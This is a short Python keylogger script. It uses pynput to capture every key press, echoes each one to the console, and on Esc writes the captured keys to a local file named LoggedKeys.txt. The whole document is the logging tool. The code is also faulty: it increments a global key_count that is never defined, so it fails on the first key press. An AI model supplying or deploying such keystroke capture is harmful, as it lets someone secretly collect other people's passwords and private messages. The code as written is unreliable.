from pynput import keyboard


keylogsfile=open("LoggedKeys.txt",'a')
keys=[]



def pressed(key):

    global key_count
    global keys  
  
    try:
        print('{0} pressed'.format(key.char))
        keys.append(key.char)
        key_count+=1
    except AttributeError:
        print('special key {0} pressed'.format(key))
        keys.append(key)
        key_count+=1

   
  

def released(key):
    print('{0} released'.format( key))
    if key == keyboard.Key.esc:
        write_File(keys)
        keylogsfile.close()
        return False
    
  
def write_File(key):
    for key in keys:
        if(key==keyboard.Key.space):
            keylogsfile.write("\n")
            continue
    
        keylogsfile.write(str(key))

with keyboard.Listener( on_press=pressed, on_release=released) as listener:
    listener.join()
    
